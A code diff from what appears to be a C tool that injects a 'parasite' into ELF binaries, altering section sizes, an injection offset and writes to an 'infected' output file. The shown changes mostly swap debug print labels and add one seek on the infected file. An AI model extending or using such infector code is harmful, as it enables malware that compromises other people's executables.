@@ -190,8 +190,8 @@ int main(int argc, char * argv[]){
      section_headers[i]->sh_size += parasite_length;
     }
     else{
-        //printf("ignoring section header[%d]. sh_offset=%d(0x%x).\n",i,section_headers[i]->sh_offset,section_headers[i]->sh_offset);
     }
+    //printf("[Debug] sh_addr = %x, sh_size = %x, new_code = %x.\n",section_headers[i]->sh_addr,section_headers[i]->sh_size,new_code_address);
 	}
 	
 	//debug code
@@ -241,8 +241,6 @@ int main(int argc, char * argv[]){
   print_val("sizeof(elf_header)",sizeof(elf_header));
   print_val("elf_header->e_ehsize",elf_header->e_ehsize);
   print_val("current lseek position",position);
-  print_val("original lseek position",elf_header->e_ehsize + (elf_header->e_phentsize * elf_header->e_phnum));
-  print_val("suspected lseek position",(elf_header->e_ehsize + phdrs_length));
   print_val("parasite_injection_offset",parasite_injection_offset);
 
   printf("[Info] copying headers to new file...\n");
@@ -321,6 +319,7 @@ int main(int argc, char * argv[]){
   print_val("filesize",fd_filesize);
 
   lseek(fd,saved_seek,SEEK_SET); //Reposition to the previous seek
+  lseek(infected_descriptor,0,SEEK_END);
 
 	//write everything to end of file	
   puts("[Info] Writing remaining data to file...");
@@ -506,10 +505,10 @@ void copy_partial(int fd, int od, unsigned int len){
 }
 
 void print_val(char *  name, int val){
-  printf("[Info] %s = %d (0x%x)\n",name,val,val);
+  printf("[Debug] %s = %d (0x%x)\n",name,val,val);
 }
 void print_char_val(char * name, unsigned char * val){
-  printf("[Info] %s = %s\n",name,val);
+  printf("[Debug] %s = %s\n",name,val);
 }
 
 void print_elf_headers(Elf32_Ehdr * ehdr){
